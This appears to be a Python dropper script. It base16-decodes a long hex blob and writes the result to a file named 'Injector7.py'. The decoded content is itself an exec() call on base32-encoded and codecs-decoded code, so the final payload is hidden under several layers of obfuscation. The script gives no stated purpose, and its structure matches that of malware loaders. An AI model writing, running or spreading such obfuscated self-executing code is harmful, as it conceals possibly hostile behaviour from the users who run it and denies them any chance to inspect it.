
import base64

obs = r'6578656328636F646563732E6465636F6465286261736536342E6233326465636F64652872274D5634474B595A494D4E5857495A4C444F4D5847495A4C444E3553474B4B44434D465A574B4E5255465A52444D4E44454D565257365A444646425A434F5753594E42574653364C494E4A52444555544D4C455A5532354B3249354C47555952534B4A57455752324B4E42525445564A534A5A42544B324B5049524C47575753584A5A3346555232564E355257535A43594D4E4B4643334C46474248445356544C4D5242464D4D52554F4646554B3643594B524D475954534D4B5A5345345A42514B5956564D33434B4A5647554D5353494A4A4C58415443514E4E5547595742524E4244464F324C4C47564D564B5454494D515A473633434F4B56545755594C4F4E52324647525451474E48564F57534A4B35584749544C4649565547435332474A4A585647525451474E4B44455753494B4A4445324E444549565547435542524E4258464752324B475652444733434A4B35564453544C42495655474359544C4C4A55564751324E4F354C464F3243494C4A43464336535A474253454B564C324E423456454D534F475A46544332434A4B3555575155334249565547435A425150413246475254504E354B57323243494B465755455353324E4E5345475443554A59594647524449474E4B454F5653494A4A57564D544C45495654544B544B484F415A5645364B32474E4C55513243494A4E4548515433464B565454495332474B5A5A564752444C48424846473243494A4A5656433654454B565257365543464E41324645364B324E524B454F35434A4A354B484F4D4B4C49565257325553454A595946454D534F4D354754455453494A4A57564D544C4549565257365A43454A4A344645364B5A504A5445515353494A4A57465553544447425454495332474B59595645364C4948424B473454534A4A3544544B535332474254544B5543454E42335645364B3249564754475453494A4E45485154444549565257325643554E51594647524449474E4B573256534A4A35425751553342495654544B5543454B5A344645364B324B354A47325A43494A4A4C44535A54434742525732544A5450415946475244484E354C464F56534A4A354354413532324E4E52573256544C4C49595645364B324B354A473257534A4A3545474955444549565257365A43454A46574645364B324B354A47345453494A4A5656433653584E4E52584154544D49565A4645364C4848424A46473443494A4A4A58474F43324E4E52573257535648465656475244494A5A47544553534A4A3545474955444547425257365A53464F4E5A4645364B324E524B455157534A4A35425751565332474254544B5543454B595A4645364B324A5A48473254534A4A3544544B544B324B56545449554C3248464D5645364C4947424757533443494C455A454336535A47425257325643564A5A5556475244494F564B454F57534A4A3543445332444649565257365A53464E41594645364B324E524A564F5A43494C455A454336535A47425257365543464B595A4645364C494F465358535553494A4A57544B553232495654544B544B484F415A56475244494B3548473451534A4A354B484F364C43474252573257535650425946454D534F475A49454F4F4B4A4A3543544135334549565454495A425148455A46475244494E524954455653494A4E4B465555534D4B5654544959544C4E52345647524449495254454F4F4B494A4A5654414E4C4549565347555742545042554645364B574D5A4944454F4B494A4E4348515133444E4E5454495753564A5A5846475244484E354C554F5A434A4A354344533244454B56525736594C4F47555956475244484E354C464F3243494A4E434851534C444E4E54544B5543454B565A4645364C494F465447324F4B4A4A35434453323342495652584154544D495959564752444C4F354E444757534A4A354547495543324B5652573256544C4C4A565645364C4948424A54475453494A4E4B46555554464E4E5454495643554A5A56464752444846354E454F57534A4A3544564D52444447425347555932544E42574645364B324A5A48473252534A4A3544544B5232324E4E5454495A42514846574647524449474E4B44453343494A4A57465552334249565454495332474E4259464752444949524D44454E4B4A4A3544564D5244444B565454495A42514845594645364B324B354A564F5653494A4E45485154444447425257365543464B595A4645364C494F465358535753494A4A57544B55334547425454495332474B5959564752444C4F354E44473243494A4A5847495653324E4E52573256544C4C495A56475244494A5A4755515153494A4E454643364B4B4E4E52575957443248465756475244494E524954455253494C455A57364C33434742545449554A524846335645364C494F4654473455534A4A354344533244434B5654544959544C4C4A564645364B3249564754455753494A4A574655535332474252573256544C4C495956475244494F564B454F5753494A4E45485154434C4E4E525736594C4F47563456475244484E354C464F36434A4A354547495543324B565257365A53464F4D3446475244494A5A47554F4F4B4A4A35425751574C424B5654544B544B484F415A56475244494A5A47555153534A4A354547495533424B565454495542534B4A5756475244494E524954455553494A4A5645344F43324742534755574B45494A574645364B32495647544334434A4A354B454532323247425257365353454D3558564752444C48424846515153494A4A5746555232324E4E5347555932544F523256475244494A5A4755515153494A4A4C44514C33434E4E52573256544C4C4A5956475244494A5A4754455453494A4E43485152534C47425257325643564A5A595647524449474E4B444757534A4A354257515653324E4E54544956544B4C495946475244494A5A4755515453494A4A57564D53535A47425454495753554E525546475244494F564A56515353494A4E4458415A4C4347425454495A42514846584645364C4848424A46473343494A4A5645344F43324B56525736594C4F4F4E574645364B324A5A49544553534A4A354446534E4B5A4E4E5454495332474B59595645364C4948424A585335434A4A3545474955334249565347575453454C4A345645364C4848424A464733434A4A3543544135325A4E4E52573259544D4A495A56475244484E354C554F5A43494A4A5654414E4C424B56525736594C4F4F52344645364B324E524B455155534A4A354547495543324E4E5257325643554E51595645364C4948424A544756534A4A354257515654464B56545449544C3250423246454D534F4D3547554F5553494C463458494F4332495654544956544B4E52564645364C4947424757345753494C4A4C58414B334447425345495453454E525946454D434E504A5357573243464B4E57553233534C4B4E5658414A5A4A464555513D3D3D3D27292929'


# Decompress the obfuscated code
decode1 = base64.b16decode(obs)

# Decode the decompressed code
decoded_code = decode1.decode()

# Now you have the decoded and decompressed code available in the `decoded_code` variable

# Save the decompressed code to a file
output_file = "Injector7.py"  # Specify the desired output file name

with open(output_file, "w") as file:
    file.write(decoded_code)
    